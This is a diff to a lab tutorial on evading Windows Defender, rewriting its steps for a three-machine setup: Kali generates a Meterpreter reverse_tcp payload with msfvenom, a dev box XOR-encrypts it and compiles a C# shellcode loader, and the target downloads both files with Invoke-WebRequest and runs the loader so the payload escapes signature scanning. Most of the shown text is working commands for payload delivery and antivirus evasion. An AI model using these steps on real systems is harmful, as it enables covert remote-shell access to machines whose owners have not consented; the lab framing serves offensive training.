@@ -10,7 +10,7 @@ You finished Document 05. You built Loader 01 (the basic shellcode loader), ran 
 
 You can write C# programs, call Windows API functions with DllImport, allocate memory, copy bytes, create threads, and read the results in Protection History.
 
-Your lab is running with Windows 11 (Defender on, default settings) at 192.168.10.100 and Kali at 192.168.10.200.
+Your lab has three machines: dev box (ammulu, 192.168.10.150) for compiling, target (kimjongun, 192.168.10.100) with Defender at full defaults, and Kali (192.168.10.200) for shellcode and listeners.
 
 ## Why This Is Next
 
@@ -124,28 +124,34 @@ But the loader binary itself still has the suspicious DllImport entries and stil
 
 ## Getting the Loader Onto the Target
 
-You need to transfer two files to your Windows 11 machine:
+The three-machine workflow for this loader:
+
+1. **Kali (192.168.10.200):** Generate raw shellcode with msfvenom, host it on a Python HTTP server.
+2. **Dev box (ammulu, 192.168.10.150):** Download shellcode from Kali. Compile both the encoder and the loader. Run the encoder to XOR-encrypt the shellcode. Host the compiled loader and encrypted shellcode on a Python HTTP server.
+3. **Target (kimjongun, 192.168.10.100):** Download xor_loader.exe and encrypted.bin from the dev box. Run the loader.
+
+You need to transfer two files to the target:
 
 1. **xor_loader.exe** - the compiled loader binary
 2. **encrypted.bin** - the XOR-encrypted shellcode file
 
-The encrypted.bin file will survive Defender's real-time file scanning because its bytes do not match any known signatures. The xor_loader.exe binary is a compiled C# program that Defender may or may not flag on disk (it depends on whether the import table pattern matches Defender's heuristic rules).
+The encrypted.bin file will survive Defender's real-time file scanning on the target because its bytes do not match any known signatures. The xor_loader.exe binary is a compiled C# program that Defender may or may not flag on disk (it depends on whether the import table pattern matches Defender's heuristic rules).
 
-**Transfer method:** Use a Python HTTP server on Kali and download from Windows.
+**Transfer method:** Compile and encrypt on the dev box, then use a Python HTTP server on the dev box to host both files. Download them on the target.
 
-On Kali:
+On the dev box (ammulu), after compiling and encrypting:
 ```
-cd /path/to/your/files
-python3 -m http.server 8080
+cd C:\Users\ammulu\Desktop
+python -m http.server 8080
 ```
 
-On Windows (PowerShell):
+On the target (kimjongun), PowerShell:
 ```powershell
-Invoke-WebRequest -Uri "http://192.168.10.200:8080/xor_loader.exe" -OutFile "C:\Users\kimjongun\Desktop\xor_loader.exe"
-Invoke-WebRequest -Uri "http://192.168.10.200:8080/encrypted.bin" -OutFile "C:\Users\kimjongun\Desktop\encrypted.bin"
+Invoke-WebRequest -Uri "http://192.168.10.150:8080/xor_loader.exe" -OutFile "C:\Users\kimjongun\Desktop\xor_loader.exe"
+Invoke-WebRequest -Uri "http://192.168.10.150:8080/encrypted.bin" -OutFile "C:\Users\kimjongun\Desktop\encrypted.bin"
 ```
 
-When Defender scans encrypted.bin on write, it finds no matching signatures. The file stays on disk.
+When Defender on the target scans encrypted.bin on write, it finds no matching signatures. The file stays on disk.
 
 When Defender scans xor_loader.exe, it may or may not flag it depending on Defender's current heuristic rules for the import table pattern. If it does flag the binary on disk, you need the evasion techniques from later documents (07, 08) to fix that.
 
@@ -386,9 +392,9 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.200 LPORT=4444 
 
 This creates payload.bin containing raw shellcode bytes. Replace the IP and port with your Kali machine's values.
 
-### Step 2: Compile the Encoder on Windows
+### Step 2: Compile the Encoder on the Dev Box
 
-On your Windows 11 VM (192.168.10.100), open the Developer Command Prompt for Visual Studio 2022 and compile the encoder:
+On the dev box (ammulu, 192.168.10.150), open the Developer Command Prompt for Visual Studio 2022 and compile the encoder:
 
 ```
 csc /out:xor_encode.exe 02_xor_encoder.cs /define:ENCODER
@@ -396,7 +402,7 @@ csc /out:xor_encode.exe 02_xor_encoder.cs /define:ENCODER
 
 The `/define:ENCODER` flag tells the compiler to include the code inside the `#if ENCODER` block and skip the `#else` block. The result is xor_encode.exe, which only encrypts shellcode and does not import any suspicious Windows API functions.
 
-### Step 3: Compile the Loader on Windows
+### Step 3: Compile the Loader on the Dev Box
 
 ```
 csc /unsafe /out:xor_loader.exe 02_xor_encoder.cs
@@ -406,7 +412,7 @@ Without the `/define:ENCODER` flag, the compiler includes the `#else` block (the
 
 ### Step 4: Encrypt the Shellcode
 
-Transfer payload.bin to your Windows VM (or run this on Kali if you have .NET installed there). Then run the encoder:
+Transfer payload.bin from Kali to the dev box (ammulu). On Kali, host it with `python3 -m http.server 8080`. On the dev box, download it with `Invoke-WebRequest -Uri http://192.168.10.200:8080/payload.bin -OutFile C:\Users\ammulu\Desktop\payload.bin`. Then run the encoder on the dev box:
 
 ```
 xor_encode.exe payload.bin encrypted.bin
@@ -440,9 +446,16 @@ run
 
 The listener waits for an incoming connection from the shellcode.
 
-### Step 6: Run the Loader
+### Step 6: Transfer to Target and Run the Loader
 
-On your Windows 11 VM, open a command prompt and run:
+Transfer xor_loader.exe and encrypted.bin from the dev box to the target. On the dev box, start a Python HTTP server (`python -m http.server 8080` in the directory with both files). On the target (kimjongun, 192.168.10.100), download them:
+
+```powershell
+Invoke-WebRequest -Uri "http://192.168.10.150:8080/xor_loader.exe" -OutFile "C:\Users\kimjongun\Desktop\xor_loader.exe"
+Invoke-WebRequest -Uri "http://192.168.10.150:8080/encrypted.bin" -OutFile "C:\Users\kimjongun\Desktop\encrypted.bin"
+```
+
+On the target, open a command prompt and run:
 
 ```
 xor_loader.exe encrypted.bin 4A7F2B9DE3A1C084F56D1B8E97320AF6
